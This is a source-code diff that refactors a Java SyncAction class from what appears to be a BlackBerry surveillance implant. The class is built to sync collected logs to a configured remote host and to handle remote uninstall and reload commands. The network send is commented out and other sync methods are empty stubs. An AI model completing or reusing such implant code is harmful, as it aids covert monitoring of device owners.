@@ -13,8 +13,8 @@ import net.rim.device.api.util.DataBuffer;
 
 import com.ht.rcs.blackberry.AgentManager;
 import com.ht.rcs.blackberry.Common;
-import com.ht.rcs.blackberry.log.LogCollector;
 import com.ht.rcs.blackberry.agent.Agent;
+import com.ht.rcs.blackberry.log.LogCollector;
 import com.ht.rcs.blackberry.transfer.Transfer;
 import com.ht.rcs.blackberry.utils.Check;
 import com.ht.rcs.blackberry.utils.Debug;
@@ -41,34 +41,12 @@ public class SyncAction extends SubAction {
 
         logCollector = LogCollector.getInstance();
         agentManager = AgentManager.getInstance();
-        transfer = transfer.getInstance();
+        transfer = Transfer.getInstance();
     }
 
     public SyncAction(String host) {
         super(ACTION_SYNC);
         this.host = host;
-    }
-
-    protected boolean Parse(byte[] confParams) {
-        DataBuffer databuffer = new DataBuffer(confParams, 0,
-                confParams.length, false);
-
-        try {
-            this.gprs = databuffer.readInt() == 1;
-            this.wifi = databuffer.readInt() == 1;
-
-            int len = databuffer.readInt();
-            byte[] buffer = new byte[len];
-            databuffer.readFully(buffer);
-
-            host = new String(buffer);
-
-        } catch (EOFException e) {
-            debug.error("params FAILED");
-            return false;
-        }
-
-        return true;
     }
 
     public boolean Execute() {
@@ -141,6 +119,49 @@ public class SyncAction extends SubAction {
         return 0;
     }
 
+    private int internetSync() {
+        int ret = 0; // Transfer.InternetSend(host);
+
+        switch (ret) {
+        case Common.SEND_UNINSTALL:
+            debug.info("ActionSync() SEND_UNINSTALL received");
+            this.wantUninstall = true;
+            break;
+
+        case Common.SEND_RELOAD:
+            debug.info("ActionSync() SEND_RELOAD received");
+            this.wantReload = true;
+            break;
+
+        default:
+            break;
+        }
+
+        return ret;
+    }
+
+    protected boolean Parse(byte[] confParams) {
+        DataBuffer databuffer = new DataBuffer(confParams, 0,
+                confParams.length, false);
+
+        try {
+            this.gprs = databuffer.readInt() == 1;
+            this.wifi = databuffer.readInt() == 1;
+
+            int len = databuffer.readInt();
+            byte[] buffer = new byte[len];
+            databuffer.readFully(buffer);
+
+            host = new String(buffer);
+
+        } catch (EOFException e) {
+            debug.error("params FAILED");
+            return false;
+        }
+
+        return true;
+    }
+
     private void ReadParams() {
         // TODO Auto-generated method stub
 
@@ -149,27 +170,6 @@ public class SyncAction extends SubAction {
     private int WifiSync() {
         // TODO Auto-generated method stub
         return 0;
-    }
-
-    private int internetSync() {
-        int ret = 0; // Transfer.InternetSend(host);
-
-        switch (ret) {
-            case Common.SEND_UNINSTALL:
-                debug.info("ActionSync() SEND_UNINSTALL received");
-                this.wantUninstall = true;
-                break;
-
-            case Common.SEND_RELOAD:
-                debug.info("ActionSync() SEND_RELOAD received");
-                this.wantReload = true;
-                break;
-
-            default:
-                break;
-        }
-
-        return ret;
     }
 
 }
